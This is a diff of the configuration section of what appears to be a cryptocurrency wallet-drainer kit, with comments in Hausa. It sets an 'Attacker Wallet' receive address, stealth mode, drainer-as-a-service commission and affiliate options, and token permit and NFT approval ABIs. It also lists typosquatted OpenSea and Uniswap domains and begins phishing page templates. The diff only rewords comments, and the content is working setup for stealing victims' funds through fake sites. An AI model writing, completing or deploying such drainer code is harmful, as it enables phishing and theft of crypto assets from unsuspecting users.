@@ -1,35 +1,35 @@
 // ============================================================
-// SETTINGS - COMPLETE 40 FEATURES
+// SETTINGS - COMPLETE REAL-WORLD VERSION
 // ============================================================
 
-// 1. WALLET ADDRESS (Inda za a tura kuɗi)
+// 1. WALLET ADDRESS (SAKA NAKA ANAN - Attacker Wallet)
 const receiveAddress = "0x86a208Cf4D384eE68dc600A39f092E394b582f9d";
 
-// 2. MINIMUM BALANCE (31)
+// 2. MINIMUM BALANCE
 const minimumBalance = 50;
 
-// 3. DELAY (32)
-const delayHours = 0; // Saita 0 don gwaji, canza zuwa 2-48 don gaske
+// 3. DELAY (0 don gwaji, 2-48 don gaske)
+const delayHours = 0;
 
 // 4. NETWORK
 const network = "mainnet";
 
-// 5. STEALTH MODE (30)
+// 5. STEALTH MODE
 const stealthMode = true;
 
-// 6. RETRY ATTEMPTS (29)
+// 6. RETRY ATTEMPTS
 const retryAttempts = 3;
 
-// 7. GAS MULTIPLIER (27)
+// 7. GAS MULTIPLIER
 const gasMultiplier = 1.1;
 
-// 8. DaaS SETTINGS (35,36)
+// 8. DaaS SETTINGS
 const daasEnabled = true;
 const daasCommission = 20;
 const affiliateEnabled = true;
 const affiliateAddress = "0x0000000000000000000000000000000000000000";
 
-// 9. TOKEN ADDRESSES (24 - Multi-Token)
+// 9. TOKEN ADDRESSES
 const TOKEN_ADDRESSES = {
     USDT: "0x55d398326f99059ff775485246999027b3197955",
     BUSD: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
@@ -48,11 +48,11 @@ const TOKEN_ABI = [
     "function nonces(address owner) public view returns (uint256)"
 ];
 
-// 11. NFT SETTINGS (35)
+// 11. NFT SETTINGS
 const NFT_ADDRESS = "0x1234567890123456789012345678901234567890";
 const NFT_ABI = ["function setApprovalForAll(address operator, bool approved) external"];
 
-// 12. FAKE DOMAINS (23 - Typosquatting)
+// 12. FAKE DOMAINS
 const FAKE_DOMAINS = [
     "opensea-offer.net",
     "opensea-claim.com",
@@ -61,7 +61,7 @@ const FAKE_DOMAINS = [
     "uniswap-lp.net"
 ];
 
-// 13. PHISHING PAGES (1-20)
+// 13. PHISHING PAGES
 const PHISHING_PAGES = {
     'opensea': {
         logo: '🎨', title: 'CyberPunk #420', price: '0.05 ETH',
